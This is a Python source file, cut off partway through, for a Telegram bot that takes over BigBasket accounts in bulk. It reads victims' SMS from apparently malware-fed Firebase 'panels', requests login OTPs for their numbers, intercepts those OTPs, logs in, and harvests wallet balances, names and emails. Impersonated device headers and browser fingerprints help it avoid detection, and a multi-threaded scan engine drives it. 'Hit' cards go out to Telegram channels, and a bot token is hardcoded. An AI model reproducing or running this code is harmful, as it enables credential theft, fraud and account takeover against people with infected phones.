#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BigBasket Enterprise Bulk Scanner & Auto-OTP Telegram Bot — Complete Engine
Bot Token: 8538201990:AAGdZy3HmD3nja50DlHNInJXJHL6uIpdkGc (@mangerbot2423bot)

Full Jio-Bot Architecture Replication & Platform Upgrades:
- Multi-Threaded Engine: 5 concurrent scan workers for high-speed bulk checking.
- Channel Logs & Storage: Live Hit cards and final backup files broadcast to Telegram channels.
- Full Panel Manager (/panels): View, add, delete, ping health, and scan panels with inline buttons.
- Direct Paste Recognition: Paste any Firebase RTDB URL directly to add or scan immediately.
- Instant 1.8s Fast Online Harvester: Harvests 100% of live online devices without per-device HTTP stalls.
- Transparent Result Categorization: Separates Hits (> ₹0), Zero Balance, Unregistered Numbers, and Offline Devices.
- Safe Telegram UI: Strict HTML entity escaping (esc) and flood-control throttled progress bar.
- Direct DM Report Exporter: Automatically sends final BB_HITS_*.txt report via bot.send_document.
"""

import os
import sys
import re
import csv
import io
import html
import json
import time
import uuid
import random
import threading
import http.server
import socketserver
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, Any, Optional, List, Tuple, Set, Callable

try:
    import telebot
    from telebot import types
except ImportError:
    print("pip install pyTelegramBotAPI")
    sys.exit(1)

try:
    from curl_cffi import requests as cffi_requests
except ImportError:
    print("pip install curl_cffi")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("pip install requests")
    sys.exit(1)

BOT_START_TIME = time.time()

# ============ CONFIGURATION ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8538201990:AAGdZy3HmD3nja50DlHNInJXJHL6uIpdkGc")
DEFAULT_LOG_CHANNEL = os.environ.get("DEFAULT_LOG_CHANNEL", "-1003626087056")
DEFAULT_STORAGE_CHANNEL = os.environ.get("DEFAULT_STORAGE_CHANNEL", "-1003626087056")
ADMIN_USER_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_USER_IDS", "8327850869").split(",") if x.strip()]
MAX_SCAN_WORKERS = int(os.environ.get("MAX_SCAN_WORKERS", "5"))

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR = os.path.join(BASE_DIR, "results")
UPLOADS_DIR = os.path.join(BASE_DIR, "uploads")
CONFIG_DIR = os.path.join(BASE_DIR, "config")
STATE_DIR = os.path.join(CONFIG_DIR, "scans")
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(UPLOADS_DIR, exist_ok=True)
os.makedirs(CONFIG_DIR, exist_ok=True)
os.makedirs(STATE_DIR, exist_ok=True)

BB_API = "https://www.bigbasket.com"
BB_OTP_URL = f"{BB_API}/member-tdl/v3/member/otp/"
BB_LOGIN_URL = f"{BB_API}/member-tdl/v3/member/unified-login/"
BB_WALLET_URL = f"{BB_API}/wallet/v1/details"
BB_MEMBER_URL = f"{BB_API}/ui-svc/v1/member/details"
BB_DEV_REG = f"{BB_API}/mapi/v4.2.0/register/device/"
BB_UI_URL = f"{BB_API}/ui-svc/v2/header/?send_door_info=true&app_launch=true"

# Global state
user_sessions: Dict[int, dict] = {}
session_lock = threading.Lock()
active_scans: Dict[int, dict] = {}
scan_lock = threading.Lock()

# Persistent configuration
PANELS_FILE = os.path.join(CONFIG_DIR, "panels.json")
CHANNELS_FILE = os.path.join(CONFIG_DIR, "channels.json")

user_panels: Dict[int, List[str]] = {}
user_channels: Dict[int, str] = {}
cfg_lock = threading.Lock()

def load_configs():
    global user_panels, user_channels
    with cfg_lock:
        if os.path.exists(PANELS_FILE):
            try:
                with open(PANELS_FILE, "r", encoding="utf-8") as f:
                    user_panels = {int(k): v for k, v in json.load(f).items()}
            except Exception:
                pass
        if os.path.exists(CHANNELS_FILE):
            try:
                with open(CHANNELS_FILE, "r", encoding="utf-8") as f:
                    user_channels = {int(k): str(v) for k, v in json.load(f).items()}
            except Exception:
                pass

def save_configs():
    with cfg_lock:
        try:
            with open(PANELS_FILE, "w", encoding="utf-8") as f:
                json.dump({str(k): v for k, v in user_panels.items()}, f, indent=2)
            with open(CHANNELS_FILE, "w", encoding="utf-8") as f:
                json.dump({str(k): v for k, v in user_channels.items()}, f, indent=2)
        except Exception:
            pass

load_configs()

# ============ SCAN STATE PERSISTENCE & AUTO-RECOVERY ============
def get_state_file(chat_id: int) -> str:
    return os.path.join(STATE_DIR, f"scan_state_{chat_id}.json")

def save_scan_state(chat_id: int):
    with scan_lock:
        st = active_scans.get(chat_id)
        if not st or not st.get("running"):
            return
        state_data = {
            "chat_id": chat_id,
            "scan_title": st.get("scan_title", "BigBasket Bulk Scan"),
            "total": st.get("total", 0),
            "processed": st.get("processed", 0),
            "processed_phones": list(st.get("processed_phones", [])),
            "targets": st.get("all_targets", []),
            "hits": list(st.get("hits", [])),
            "zero_bal": list(st.get("zero_bal", [])),
            "no_account": list(st.get("no_account", [])),
            "offline": list(st.get("offline", [])),
            "timeout": list(st.get("timeout", [])),
            "failed": list(st.get("failed", [])),
            "start_time": st.get("start_time", time.time()),
            "last_updated": time.time(),
        }

    sf = get_state_file(chat_id)
    tmp_sf = sf + ".tmp"
    try:
        with open(tmp_sf, "w", encoding="utf-8") as f:
            json.dump(state_data, f, indent=2)
        os.replace(tmp_sf, sf)
    except Exception as e:
        print(f"⚠️ Error saving scan state: {e}")

def get_saved_scan_state(chat_id: int) -> Optional[dict]:
    sf = get_state_file(chat_id)
    if os.path.exists(sf):
        try:
            with open(sf, "r", encoding="utf-8") as f:
                data = json.load(f)
            proc_set = set(data.get("processed_phones", []))
            all_t = data.get("targets", [])
            rem = [t for t in all_t if t.get("phone") not in proc_set]
            if rem:
                return data
            else:
                clear_scan_state(chat_id)
        except Exception:
            pass
    return None

def clear_scan_state(chat_id: int):
    sf = get_state_file(chat_id)
    try:
        if os.path.exists(sf):
            os.remove(sf)
    except Exception:
        pass

# ============ RENDER 24/7 KEEP-ALIVE SERVER & HEARTBEAT ============
class RenderHealthHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.end_headers()
        uptime_sec = int(time.time() - BOT_START_TIME)
        resp = {
            "status": "healthy",
            "bot": "BigBasket Checker Bot",
            "uptime_seconds": uptime_sec,
            "uptime_human": f"{uptime_sec // 3600}h {(uptime_sec % 3600) // 60}m {uptime_sec % 60}s",
            "active_scans": len(active_scans),
            "timestamp": datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        }
        self.wfile.write(json.dumps(resp).encode("utf-8"))

    def log_message(self, format, *args):
        pass  # Suppress request spam in stdout

def start_render_health_server():
    port = int(os.environ.get("PORT", "8080"))
    def run_server():
        try:
            class ReusableTCPServer(socketserver.TCPServer):
                allow_reuse_address = True
            with ReusableTCPServer(("0.0.0.0", port), RenderHealthHandler) as httpd:
                print(f"🌍 [Render 24/7] Keep-Alive HTTP health server running on port {port}")
                httpd.serve_forever()
        except Exception as e:
            print(f"⚠️ [Render 24/7] HTTP health server warning: {e}")

    t = threading.Thread(target=run_server, daemon=True)
    t.start()

def start_render_self_ping():
    ext_url = os.environ.get("RENDER_EXTERNAL_URL") or os.environ.get("KEEP_ALIVE_URL")
    if not ext_url:
        print("ℹ️ [Render 24/7] No RENDER_EXTERNAL_URL specified. Self-ping loop idle.")
        return

    def ping_loop():
        url = f"{ext_url.rstrip('/')}/health"
        print(f"💓 [Render 24/7] Self-ping active! Pinging {url} every 9 minutes...")
        while True:
            time.sleep(540)  # Ping every 9 minutes to guarantee 0 downtime on Render
            try:
                r = requests.get(url, timeout=15)
            except Exception:
                pass

    t = threading.Thread(target=ping_loop, daemon=True)
    t.start()


def get_effective_channel(chat_id: int) -> Optional[str]:
    with cfg_lock:
        return user_channels.get(chat_id, DEFAULT_LOG_CHANNEL)

def esc(text: Any) -> str:
    """Escapes HTML special characters to prevent Telegram entity parse errors."""
    if text is None:
        return ""
    return html.escape(str(text), quote=False)

def normalize_phone(raw: Any) -> Optional[str]:
    """Extract clean 10-digit Indian mobile number."""
    if not raw:
        return None
    s = re.sub(r"[^\d]", "", str(raw))
    if len(s) == 10 and s[0] in "6789":
        return s
    if len(s) == 11 and s.startswith("0") and s[1] in "6789":
        return s[1:]
    if len(s) == 12 and s.startswith("91") and s[2] in "6789":
        return s[2:]
    if len(s) == 13 and s.startswith("091") and s[3] in "6789":
        return s[3:]
    m = re.search(r"([6-9]\d{9})", s)
    return m.group(1) if m else None

# ============ BIGBASKET NATIVE CLIENT ============
class BigBasketClient:
    def __init__(self):
        self.s = cffi_requests.Session(impersonate="chrome120")
        profiles = [
            {"make": "Samsung", "model": "SM-A536E", "os": "13"},
            {"make": "Google", "model": "Pixel 7", "os": "14"},
            {"make": "OnePlus", "model": "IN2023", "os": "13"},
            {"make": "Xiaomi", "model": "2201116SG", "os": "13"},
            {"make": "Vivo", "model": "V2249", "os": "14"},
            {"make": "Realme", "model": "RMX3363", "os": "13"},
        ]
        self.p = random.choice(profiles)
        self.did = "".join(random.choices("0123456789abcdef", k=16))
        self.token = ""
        self.h = {
            "User-Agent": f"BB Android/v8.38.0/os {self.p['os']}",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "x-channel": "BB-Android",
            "x-tcp-device-version": "android_8.38.0_25115710",
            "x-tcp-platform": "native",
            "x-entry-context": "bb-b2c",
            "x-entry-context-id": "100",
            "x-bucket-id": "36",
            "x-device-id": self.did,
            "x-device-model": f"{self.p['make']} {self.p['model']}",
            "x-is-debug": "false",
            "x-pharma": "true",
            "x-retry": "0",
            "x-integrated-fc-door-visible": "true",
            "x-tracker": str(uuid.uuid4()),
            "common-client-static-version": "105",
        }
        self._ok = False

    def _ck(self, r):
        try:
            for k, v in r.cookies.items():
                self.s.cookies.set(k, v)
        except Exception:
            pass

    def _setup(self):
        if self._ok:
            return
        try:
            p = {
                "imei": "02:00:00:00:00:00",
                "device_id": self.did,
                "city_id": "1",
                "properties": json.dumps({
                    "platform": "java",
                    "os_name": "android",
                    "os_version": self.p["os"],
                    "app_version": "8.38.0",
                    "device_make": self.p["make"],
                    "device_model": self.p["model"],
                    "screen_resolution": "1080X2400",
                    "screen_dpi": 440
                })
            }
            h = self.h.copy()
            h["Content-Type"] = "application/x-www-form-urlencoded"
            r = self.s.post(BB_DEV_REG, data=p, headers=h, timeout=12)
            self._ck(r)
        except Exception:
            pass
        try:
            r = self.s.get(BB_UI_URL, headers=self.h, timeout=10)
            self._ck(r)
        except Exception:
            pass
        self._ok = True

    def send_otp(self, phone: str) -> Tuple[bool, str]:
        self._setup()
        self.h["x-tracker"] = str(uuid.uuid4())
        c = self.s.cookies.get("csurftoken")
        if c:
            self.h["x-csurftoken"] = c
        try:
            r = self.s.post(
                BB_OTP_URL,
                json={"identifier": phone, "referrer": "unified_login"},
                headers=self.h,
                timeout=18
            )
            self._ck(r)
            if r.status_code == 403:
                return False, "Access blocked (403)"
            if r.status_code == 429:
                return False, "Rate limit exceeded (429)"
            if r.status_code >= 500:
                return False, f"BigBasket Server Error ({r.status_code})"

            try:
                d = r.json()
            except Exception:
                return False, f"Invalid response ({r.status_code})"

            if r.status_code == 200 and d.get("message") == "OTP sent successfully":
                return True, d.get("refId", "")
            err_msg = ""
            if "errors" in d and isinstance(d["errors"], list) and len(d["errors"]) > 0:
                err_msg = d["errors"][0].get("display_msg") or d["errors"][0].get("msg", "")
            return False, err_msg or "Failed to send OTP"
        except Exception as e:
            return False, str(e)

    def verify(self, phone: str, otp: str, ref: str) -> Tuple[bool, str, dict]:
        self.h["x-tracker"] = str(uuid.uuid4())
        c = self.s.cookies.get("csurftoken")
        if c:
            self.h["x-csurftoken"] = c
        try:
            r = self.s.post(
                BB_LOGIN_URL,
                json={"mobile_no": phone, "mobile_no_otp": otp, "refId": ref},
                headers=self.h,
                timeout=18
            )
            self._ck(r)
            try:
                d = r.json()
            except Exception:
                return False, f"Invalid verify response ({r.status_code})", {}

            if r.status_code == 200 and "bb_token" in d:
                token = d["bb_token"]
                self.token = token
                self.s.cookies.set("BBAUTHTOKEN", token, domain=".bigbasket.com")
                if d.get("customer_hash"):
                    self.s.cookies.set("customer_hash", d["customer_hash"], domain=".bigbasket.com")
                if d.get("m_id"):
                    self.s.cookies.set("_bb_mid", d["m_id"], domain=".bigbasket.com")
                return True, token, d
            err_msg = ""
            if "errors" in d and isinstance(d["errors"], list) and len(d["errors"]) > 0:
                err_msg = d["errors"][0].get("display_msg") or d["errors"][0].get("msg", "")
            return False, err_msg or "Invalid OTP", d
        except Exception as e:
            return False, str(e), {}

    def wallet(self) -> Optional[dict]:
        try:
            h = self.h.copy()
            h["x-entry-context"] = "bbnow"
            h["x-entry-context-id"] = "10"
            h["x-tracker"] = str(uuid.uuid4())
            if self.token:
                h["x-auth-token"] = self.token
                h["Authorization"] = f"Bearer {self.token}"

            result = {"total_balance": 0.0, "current_wallet_balance": 0.0, "neucoins": 0, "name": "", "email": ""}

            r = self.s.get(BB_WALLET_URL, headers=h, timeout=15)
            if r.status_code == 200:
                try:
                    d = r.json()
                    result["total_balance"] = float(d.get("total_balance", 0.0) or d.get("balance", 0.0) or 0.0)
                    result["current_wallet_balance"] = float(d.get("current_wallet_balance", 0.0) or d.get("usable_balance", 0.0) or 0.0)
                    result["neucoins"] = int(d.get("neucoins", 0) or d.get("points", 0) or 0)
                except Exception:
                    pass

            r2 = self.s.get(BB_MEMBER_URL, headers=h, timeout=15)
            if r2.status_code == 200:
                try:
                    d2 = r2.json()
                    if "member" in d2:
                        m = d2["member"]
                        result["name"] = f"{m.get('first_name', '')} {m.get('last_name', '')}".strip()
                        result["email"] = m.get("email", "")
                    if "wallet" in d2 and result["total_balance"] == 0:
                        w = d2["wallet"]
                        result["total_balance"] = float(w.get("total_balance", 0.0) or 0.0)
                        result["current_wallet_balance"] = float(w.get("current_wallet_balance", 0.0) or 0.0)
                except Exception:
                    pass

            return result
        except Exception:
            return None

# ============ FIREBASE ENDPOINT & OTP UTILS ============
RESOLVED_URL_CACHE: Dict[str, str] = {}
DEVICE_PATH_CACHE: Dict[str, str] = {}
cache_lock = threading.Lock()

CANDIDATE_PATHS = [
    "messages/{did}",
    "sms/{did}",
    "clients/{did}/messages",
    "clients/{did}/sms",
    "devices/{did}/messages",
    "devices/{did}/sms",
    "all_sms/{did}",
    "smsList/{did}"
]

def resolve_firebase_url(panel_or_url: str) -> Optional[str]:
    """Resolves short panel names into full RTDB endpoints with caching."""
    if not panel_or_url:
        return None
    s = panel_or_url.strip().rstrip("/")
    if s.startswith("http://") or s.startswith("https://"):
        return s
    with cache_lock:
        if s in RESOLVED_URL_CACHE:
            return RESOLVED_URL_CACHE[s]

    candidates = [
        f"https://{s}-default-rtdb.firebaseio.com",
        f"https://{s}.firebaseio.com",
        f"https://{s}-default-rtdb.asia-southeast1.firebasedatabase.app"
    ]
    for candidate in candidates:
        try:
            r = requests.get(f"{candidate}/.json?shallow=true", timeout=3)
            if r.status_code == 200:
                with cache_lock:
                    RESOLVED_URL_CACHE[s] = candidate
                return candidate
        except Exception:
            pass

    fallback = f"https://{s}-default-rtdb.firebaseio.com"
    with cache_lock:
        RESOLVED_URL_CACHE[s] = fallback
    return fallback

def extract_bb_otp(text: str, sender: str) -> Optional[str]:
    """Extracts BigBasket login OTP from SMS message body and sender headers."""
    if not text:
        return None
    combined = f"{sender} {text}".lower()
    is_bb = any(k in combined for k in (
        "bbaskt", "bigbkt", "bigbsk", "tatane", "tatapay", "tata",
        "bbnow", "bb-now", "bigbasket", "neu"
    ))
    has_otp_kw = any(k in combined for k in (
        "otp", "code", "pin", "login", "verification", "secret", "verify"
    ))
    if not (is_bb or has_otp_kw):
        return None

    # Pattern 1: Digits after keywords: "Bigbasket login code: 704651" / "OTP: 123456"
    m = re.search(r"(?:otp|code|is|pin|login|verification)[\s\S]{0,25}?\b([0-9]{4,6})\b", text, re.I)
    if m:
        return m.group(1)

    # Pattern 2: Digits before keywords: "704651 is your BigBasket OTP"
    m_before = re.search(r"\b([0-9]{4,6})\b\s*(?:is\s*(?:your|the)\s*)?(?:otp|code|verification|login|secret)", text, re.I)
    if m_before:
        return m_before.group(1)

    # Pattern 3: Dash-separated: 123-456
    m_dash = re.search(r"\b([0-9]{3})-([0-9]{3})\b", text)
    if m_dash:
        return f"{m_dash.group(1)}{m_dash.group(2)}"

    # Pattern 4: Fallback if sender or body is explicitly BigBasket
    if is_bb:
        m_6 = re.search(r"\b([0-9]{6})\b", text)
        if m_6:
            return m_6.group(1)
        m_4 = re.search(r"\b([0-9]{4})\b", text)
        if m_4:
            return m_4.group(1)
    return None

def find_working_device_path(clean_url: str, did: str) -> str:
    """Finds and caches which Firebase path stores SMS for this device across APK variants."""
    cache_key = f"{clean_url}:{did}"
    with cache_lock:
        if cache_key in DEVICE_PATH_CACHE:
            return DEVICE_PATH_CACHE[cache_key]

    for template in CANDIDATE_PATHS:
        p = template.format(did=did)
        try:
            endpoint = f"{clean_url}/{p}.json"
            r = requests.get(endpoint, timeout=3)
            if r.status_code == 200 and r.json() is not None:
                with cache_lock:
                    DEVICE_PATH_CACHE[cache_key] = p
                return p
        except Exception:
            pass

    default_path = f"messages/{did}"
    with cache_lock:
        DEVICE_PATH_CACHE[cache_key] = default_path
    return default_path

def fetch_existing_message_keys(fb_url: str, did: str) -> Set[str]:
    """Fetches already present message IDs prior to sending OTP so older messages are skipped."""
    known = set()
    clean_url = fb_url.rstrip("/")
    active_path = find_working_device_path(clean_url, did)
    try:
        endpoint = f"{clean_url}/{active_path}.json"
        r = requests.get(endpoint, timeout=5)
        if r.status_code == 200 and isinstance(r.json(), dict):
            known.update(str(k) for k in r.json().keys())
    except Exception:
        pass
    return known

def watch_device_otp(
    fb_url: str,
    did: str,
    known_keys: Set[str],
    sent_time: float,
    timeout_sec: int = 40,
    stop_checker: Optional[Callable[[], bool]] = None
) -> Optional[str]:
    """Watches Firebase RTDB messages for incoming BigBasket OTP (aborts instantly if stop requested)."""
    if not fb_url or not did:
        return None
    clean_url = fb_url.rstrip("/")
    start_time = time.time()
    active_path = find_working_device_path(clean_url, did)

    while time.time() - start_time < timeout_sec:
        if stop_checker and stop_checker():
            return None

        try:
            endpoint = f"{clean_url}/{active_path}.json"
            r = requests.get(endpoint, timeout=4)
            if r.status_code == 200 and isinstance(r.json(), dict):
                data = r.json()
                for mk, item in reversed(list(data.items())):
                    if str(mk) in known_keys or not isinstance(item, dict):
                        continue
                    
                    text = str(item.get("message") or item.get("body") or item.get("msg") or item.get("text") or "")
                    sender = str(item.get("sender") or item.get("phone") or item.get("address") or "").upper()
                    
                    otp = extract_bb_otp(text, sender)
                    if otp:
                        return otp
        except Exception:
            pass
        time.sleep(2.0)
    return None

def is_device_online(data: Any) -> bool:
    if not isinstance(data, dict):
        return False
    candidates = [data]
    for sub in ("info", "deviceInfo", "device_info", "details", "client", "system"):
        if isinstance(data.get(sub), dict):
            candidates.append(data.get(sub))
    for c in candidates:
        st = c.get("status")
        if st is not None:
            if st is True or str(st).lower() in ("online", "true", "1", "active"):
                return True
            if st is False or str(st).lower() in ("offline", "false", "0"):
                return False
    now = time.time()
    for c in candidates:
        for ts_k in ("timestamp", "last_seen", "lastSeen", "time", "updated_at"):
            val = c.get(ts_k)
            if val:
                try:
                    t_val = float(val)
                    if t_val > 1e11:
                        t_val /= 1000.0
                    if -180 <= (now - t_val) <= 900:
                        return True
                except Exception:
                    pass
    return False

def audit_device_sim_slots(did: str, dev_data: dict, fb_url: str, panel_ref: str) -> List[Dict[str, Any]]:
    """Fast in-memory audit of both SIM 1 & SIM 2 on the device."""
    targets = []
    seen = set()
    dev_name = dev_data.get("modelName") or dev_data.get("model") or dev_data.get("device") or "Android Device"

    # 1. Inspect sims container
    sim_container = dev_data.get("sims") or dev_data.get("simInfo") or dev_data.get("simList")
    if isinstance(sim_container, dict):
        sim_container = list(sim_container.values())

    if isinstance(sim_container, list) and len(sim_container) > 0:
        for idx, s in enumerate(sim_container):
            if isinstance(s, dict):
                carrier = s.get("carrierName") or s.get("carrier") or s.get("operator") or dev_data.get("service_provider") or "SIM"
                slot_idx = s.get("simSlotIndex") or s.get("slot") or idx
                slot_num = int(slot_idx) + 1 if str(slot_idx).isdigit() else (idx + 1)
                raw_num = s.get("phoneNumber") or s.get("number") or s.get("phone") or s.get("mobNo")
                num = normalize_phone(raw_num)
                
                if num and num not in seen:
                    seen.add(num)
                    targets.append({
                        "phone": num,
                        "device": dev_name,
                        "dev_id": did,
                        "panel": fb_url,
                        "panel_name": panel_ref,
                        "slot": f"Hardware SIM Slot {slot_num} ({carrier})",
                        "is_physical_sim": True
                    })

    # 2. Check root phone keys
    for k in ("mobNo", "phoneNumber", "phone", "mobile", "sim1", "sim2"):
        val = dev_data.get(k)
        if val:
            num = normalize_phone(val)
            if num and num not in seen:
                seen.add(num)
                slot_title = "Hardware SIM Slot 1" if "1" in k or k in ("mobNo", "phoneNumber", "phone", "mobile") else "Hardware SIM Slot 2"
                targets.append({
                    "phone": num,
                    "device": dev_name,
                    "dev_id": did,
                    "panel": fb_url,
                    "panel_name": panel_ref,
                    "slot": slot_title,
                    "is_physical_sim": True
                })

    return targets

# ============ SCRAPED FILE PARSER ============
def parse_scraped_file(filepath_or_content: str, fallback_panel: str = "") -> List[Dict[str, Any]]:
    """
    Parses clean_numbers_*.txt / all_panels_*.txt / bulk_scrape_*.txt / .csv files.
    Extracts complete bridge mapping: phone, dev_id, panel, slot, device.
    """
    content = filepath_or_content
    if os.path.exists(filepath_or_content):
        try:
            with open(filepath_or_content, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception:
            pass

    content = content.replace("\r\n", "\n").replace("\r", "\n")
    targets = []
    seen = set()

    # Format 1: CSV format
    if "," in content and ("Phone Number" in content or "Device ID" in content or "Firebase" in content):
        try:
            reader = csv.DictReader(io.StringIO(content))
            for row in reader:
                is_caller = any("caller" in str(v).lower() or "alert" in str(v).lower() for k, v in row.items() if "type" in k.lower() or "source" in k.lower() or "slot" in k.lower())
                rec_otp = any("yes" in str(v).lower() for k, v in row.items() if "otp" in k.lower())
                raw_num = row.get("Phone Number") or row.get("Raw Number") or row.get("phone") or row.get("number")
                m_num = re.search(r"([6-9]\d{9})", str(raw_num))
                if m_num and (rec_otp or not is_caller):
                    num = m_num.group(1)
                    if num not in seen:
                        seen.add(num)
                        did = row.get("Device ID") or row.get("deviceId") or ""
                        pnl = row.get("Firebase URL") or row.get("Firebase DB") or row.get("panel") or fallback_panel
                        dname = row.get("Device Name") or row.get("model") or "Device"
                        targets.append({
                            "phone": num,
                            "device": dname.strip(),
                            "dev_id": did.strip(),
                            "panel": resolve_firebase_url(pnl.strip()),
                            "panel_name": pnl.strip(),
                            "slot": "Hardware SIM",
                            "is_physical_sim": True
                        })
        except Exception:
            pass

    # Format 2: Bridge line format in Section [A]:
    line_matches = re.findall(
        r"([6-9]\d{9})\s*\|\s*did:([^\s|]+)\s*\|\s*panel:([^\s|]+)(?:\s*\|\s*dev:([^\n|]+))?",
        content
    )
    for num, did, pnl, dname in line_matches:
        num = num.strip()
        if num not in seen:
            seen.add(num)
            targets.append({
                "phone": num,
                "device": (dname or "Device").strip(),
                "dev_id": did.strip(),
                "panel": resolve_firebase_url(pnl.strip()),
                "panel_name": pnl.strip(),
                "slot": "Hardware SIM",
                "is_physical_sim": True
            })

    # Format 3: Detailed card blocks in Section 1:
    card_matches = re.findall(
        r"📱\s*([6-9]\d{9})[\s\S]*?•\s*Device:\s*([^\n]+)[\s\S]*?•\s*Dev ID:\s*([^\n]+)[\s\S]*?•\s*Panel:\s*([^\n]+)[\s\S]*?•\s*Slot:\s*([^\n]+)",
        content
    )
    for num, dev, did, pnl, slot in card_matches:
        num = num.strip()
        if num not in seen:
            seen.add(num)
            targets.append({
                "phone": num,
                "device": dev.strip(),
                "dev_id": did.strip(),
                "panel": resolve_firebase_url(pnl.strip()),
                "panel_name": pnl.strip(),
                "slot": slot.strip(),
                "is_physical_sim": True
            })

    # Format 4: Multi-panel block format:
    all_pnl_matches = re.findall(
        r"([6-9]\d{9})\s*\nDevice:\s*([^\n(]+)\s*\(([^)]+)\)[\s\S]*?Firebase:\s*([^\n]+)",
        content
    )
    for num, dev, did, pnl in all_pnl_matches:
        num = num.strip()
        if num not in seen:
            seen.add(num)
            targets.append({
                "phone": num,
                "device": dev.strip(),
                "dev_id": did.strip(),
                "panel": resolve_firebase_url(pnl.strip()),
                "panel_name": pnl.strip(),
                "slot": "Hardware SIM",
                "is_physical_sim": True
            })

    # Format 5: Raw numbers fallback
    if not targets:
        m_sec_a = re.search(r">>> \[A\] PHYSICAL SIMS[^\n]*\n([\s\S]*?)(?:>>>|━━━━━━━━|\Z)", content)
        raw_nums = re.findall(r"\b([6-9]\d{9})\b", m_sec_a.group(1)) if m_sec_a else re.findall(r"\b([6-9]\d{9})\b", content)
        for num in raw_nums:
            if num not in seen:
                seen.add(num)
                targets.append({
                    "phone": num,
                    "device": "Imported Number",
                    "dev_id": "",
                    "panel": resolve_firebase_url(fallback_panel) if fallback_panel else "",
                    "panel_name": fallback_panel or "",
                    "slot": "Physical SIM",
                    "is_physical_sim": True
                })

    return targets

# ============ TELEGRAM BOT INITIALIZATION & SAFE WRAPPERS ============
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

def safe_send(chat_id: int, text: str, reply_markup=None):
    """Safely sends a message with fallback to plain text if HTML entity parsing fails."""
    try:
        truncated = text[:4000] if len(text) > 4000 else text
        return bot.send_message(chat_id, truncated, reply_markup=reply_markup, disable_web_page_preview=True)
    except Exception as e:
        try:
            plain = re.sub(r"<[^>]+>", "", text)
            plain_trunc = plain[:4000] if len(plain) > 4000 else plain
            return bot.send_message(chat_id, plain_trunc, reply_markup=reply_markup, parse_mode=None, disable_web_page_preview=True)
        except Exception:
            return None

def safe_edit(chat_id: int, message_id: int, text: str, reply_markup=None):
    """Safely edits a message with flood-control and plain-text fallback."""
    try:
        truncated = text[:4000] if len(text) > 4000 else text
        bot.edit_message_text(truncated, chat_id, message_id, reply_markup=reply_markup, disable_web_page_preview=True)
    except Exception:
        try:
            plain = re.sub(r"<[^>]+>", "", text)
            plain_trunc = plain[:4000] if len(plain) > 4000 else plain
            bot.edit_message_text(plain_trunc, chat_id, message_id, reply_markup=reply_markup, parse_mode=None, disable_web_page_preview=True)
        except Exception:
            pass

def broadcast_hit_to_channels(hit_card: str, chat_id: int):
    """Broadcasts hit cards to both user log channel and master storage channel."""
    channels = set()
    user_ch = get_effective_channel(chat_id)
    if user_ch:
        channels.add(user_ch)
    if DEFAULT_LOG_CHANNEL:
        channels.add(DEFAULT_LOG_CHANNEL)

    for ch in channels:
        try:
            safe_send(int(ch) if str(ch).lstrip("-").isdigit() else ch, hit_card)
        except Exception:
            pass

def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("🌐 Direct Firebase Panel Scan"),
        types.KeyboardButton("📁 Upload Scraped File"),
        types.KeyboardButton("⚙️ Panel Manager"),
        types.KeyboardButton("📢 Channel Settings"),
        types.KeyboardButton("📱 Check Single Number"),
        types.KeyboardButton("📊 View Latest Hits"),
        types.KeyboardButton("ℹ️ Help / Commands")
    )
    return markup

def cancel_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("❌ Cancel"))
    return markup

def stop_scan_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 Stop Scan & Download Report", callback_data="stop_current_scan"))
    return markup

# ============ MULTI-THREADED SCAN ENGINE ============
def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str = "BigBasket Bulk Scan", resume_data: Optional[Dict[str, Any]] = None):
    with scan_lock:
        if chat_id in active_scans and active_scans[chat_id].get("running"):
            safe_send(chat_id, "⚠️ Ek scan already chal raha hai! Pehle use /stop karein.")
            return

        if resume_data:
            all_targets = resume_data.get("targets", targets)
            proc_phones = set(resume_data.get("processed_phones", []))
            targets_to_run = [t for t in all_targets if t.get("phone") not in proc_phones]
            total = resume_data.get("total", len(all_targets))

            active_scans[chat_id] = {
                "running": True,
                "stop_requested": False,
                "scan_title": resume_data.get("scan_title", scan_title),
                "all_targets": all_targets,
                "total": total,
                "processed": len(proc_phones),
                "processed_phones": list(proc_phones),
                "hits": list(resume_data.get("hits", [])),
                "zero_bal": list(resume_data.get("zero_bal", [])),
                "no_account": list(resume_data.get("no_account", [])),
                "offline": list(resume_data.get("offline", [])),
                "timeout": list(resume_data.get("timeout", [])),
                "failed": list(resume_data.get("failed", [])),
                "start_time": resume_data.get("start_time", time.time()),
            }
            is_resumed = True
        else:
            all_targets = targets
            targets_to_run = targets
            total = len(targets)
            active_scans[chat_id] = {
                "running": True,
                "stop_requested": False,
                "scan_title": scan_title,
                "all_targets": all_targets,
                "total": total,
                "processed": 0,
                "processed_phones": [],
                "hits": [],
                "zero_bal": [],
                "no_account": [],
                "offline": [],
                "timeout": [],
                "failed": [],
                "start_time": time.time(),
            }
            is_resumed = False
            save_scan_state(chat_id)

    with_device = sum(1 for t in targets_to_run if t.get("dev_id") and t.get("panel"))

    start_msg_text = (
        f"▶️ <b>Resuming {esc(scan_title)}!</b>\n\n"
        f"📋 <b>Remaining to Scan:</b> <code>{len(targets_to_run)}/{total}</code> SIMs\n"
        f"🔥 <b>Existing Hits Preserved:</b> <b>{len(active_scans[chat_id]['hits'])}</b>\n"
        f"🏎️ <b>Concurrency:</b> <b>{MAX_SCAN_WORKERS} Multi-threaded Workers Active</b>\n\n"
        f"⏳ Resuming workers & catching OTPs in parallel..."
    ) if is_resumed else (
